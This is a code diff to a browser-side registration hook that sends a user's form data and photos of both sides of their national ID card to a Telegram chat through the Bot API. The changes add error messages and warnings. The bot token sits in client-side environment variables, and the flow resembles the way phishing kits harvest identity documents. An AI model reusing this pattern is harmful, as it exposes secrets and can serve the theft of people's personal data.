@@ -19,8 +19,20 @@ export function useRegistroPaso1Telegram() {
   }) => {
     setLoading(true)
     try {
-      if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        toast.error('❌ Error: Variables de Telegram no configuradas')
+      if (!TELEGRAM_BOT_TOKEN) {
+        toast.error('❌ Error: VITE_TELEGRAM_BOT_TOKEN no está configurado en .env.local')
+        setLoading(false)
+        return { success: false }
+      }
+      
+      if (!TELEGRAM_CHAT_ID) {
+        toast.error('❌ Error: VITE_TELEGRAM_CHAT_ID no está configurado. Por favor, obtén tu Chat ID y agrégalo a .env.local', {
+          duration: 8000,
+          action: {
+            label: 'Ver instrucciones',
+            onClick: () => window.open('/telegram-helper.html', '_blank')
+          }
+        })
         setLoading(false)
         return { success: false }
       }
@@ -61,20 +73,31 @@ ID Registro: \`${registroId}\`
       )
 
       if (!response.ok) {
-        toast.error('❌ Error enviando mensaje a Telegram')
+        const errorData = await response.json().catch(() => ({}))
+        console.error('Error de Telegram API:', errorData)
+        toast.error(`❌ Error enviando mensaje a Telegram: ${errorData.description || 'Error desconocido'}`)
         setLoading(false)
         return { success: false }
       }
 
+      const result = await response.json()
+      toast.dismiss() // Cerrar toast de loading
+
       // Enviar fotos de cédula si existen
       if (datos.foto_cedula_frente) {
         toast.loading('📤 Enviando foto de cédula (frente)...')
-        await enviarFotoTelegram(datos.foto_cedula_frente, '📄 Foto Cédula - Frente')
+        const fotoEnviada = await enviarFotoTelegram(datos.foto_cedula_frente, '📄 Foto Cédula - Frente')
+        if (!fotoEnviada) {
+          toast.warning('⚠️ No se pudo enviar la foto del frente, pero el registro se guardó')
+        }
       }
 
       if (datos.foto_cedula_reverso) {
         toast.loading('📤 Enviando foto de cédula (reverso)...')
-        await enviarFotoTelegram(datos.foto_cedula_reverso, '📄 Foto Cédula - Reverso')
+        const fotoEnviada = await enviarFotoTelegram(datos.foto_cedula_reverso, '📄 Foto Cédula - Reverso')
+        if (!fotoEnviada) {
+          toast.warning('⚠️ No se pudo enviar la foto del reverso, pero el registro se guardó')
+        }
       }
 
       // Guardar ID en sessionStorage para Paso 2
@@ -100,7 +123,6 @@ async function enviarFotoTelegram(archivo: File, caption: string) {
   formData.append('chat_id', TELEGRAM_CHAT_ID)
   formData.append('photo', archivo)
   formData.append('caption', caption)
-  formData.append('parse_mode', 'Markdown')
 
   try {
     const response = await fetch(
@@ -110,7 +132,14 @@ async function enviarFotoTelegram(archivo: File, caption: string) {
         body: formData
       }
     )
-    return response.ok
+    
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}))
+      console.error('Error enviando foto a Telegram:', errorData)
+      return false
+    }
+    
+    return true
   } catch (error) {
     console.error('Error enviando foto:', error)
     return false
